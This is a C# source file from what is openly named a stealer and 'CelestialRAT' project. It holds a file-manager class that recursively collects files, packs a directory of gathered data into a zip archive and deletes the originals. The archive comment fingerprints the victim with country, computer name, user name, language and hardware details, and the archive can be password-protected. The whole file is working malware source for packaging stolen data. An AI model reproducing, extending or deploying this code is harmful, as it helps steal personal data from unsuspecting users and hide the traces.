using celestialC.Helper;
using celestialC.Helper.Information;
using Ionic.Zip;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace celestialC.Stealer
{
    internal sealed class Filemanager
    {

        // Remove directory
        public static void RecursiveDelete(string path)
        {
            DirectoryInfo baseDir = new DirectoryInfo(path);

            if (!baseDir.Exists) return;
            foreach (var dir in baseDir.GetDirectories())
                RecursiveDelete(dir.FullName);

            baseDir.Delete(true);
        }

        public static string[] GetFiles(string path, string searchPattern)
        {
            List<string> files = new List<string>();

            try
            {
                // Get the files in the current folder.
                files.AddRange(Directory.GetFiles(path, searchPattern));

                // Get files in subfolders recursively.
                foreach (string subfolder in Directory.GetDirectories(path))
                {
                    files.AddRange(GetFiles(subfolder, searchPattern));
                }
            }
            catch (UnauthorizedAccessException)
            {
                // Ignore inaccessible folder and continue.
            }

            return files.ToArray();
        }
        // Create archive
        public static string CreateArchive(string directory, bool setpassword, int seed = 1337)
        {
            if (Directory.Exists(directory))
            {
                using (ZipFile zip = new ZipFile(System.Text.Encoding.Default))
                {
                    zip.CompressionLevel = Ionic.Zlib.CompressionLevel.BestCompression;
                    zip.Comment = "" +
                        "\nCelestialRAT - log " + "(" + ComputerInfo.GetCountry() + ")" +
                        "\n" +
                        "\n / System \\" +
                        "\nDate: " + ComputerInfo.datenow +
                        "\nComputerName: " + ComputerInfo.GetName() +
                        "\nUserName: " + ComputerInfo.username +
                        "\nLanguage: " + ComputerInfo.culture +
                        "\n" +
                        "\n / Hardware \\" +
                        "\nGPU: " + ComputerInfo.GetGPU() +
                        "\nCPU: " + ComputerInfo.GetCPU() +
                        "\nRAM Amount: " + ComputerInfo.GetRamAmount() +
                        "\nScreen Metrics: " + ComputerInfo.ScreenMetrics();
                    if (setpassword)
                        zip.Password = Encryption.ComputeSHA256(seed.ToString());
                    zip.AddDirectory(directory);
                    zip.Save(directory + ".zip");
                }
            }

            RecursiveDelete(directory);
            return directory + ".zip";
        }


    }
}
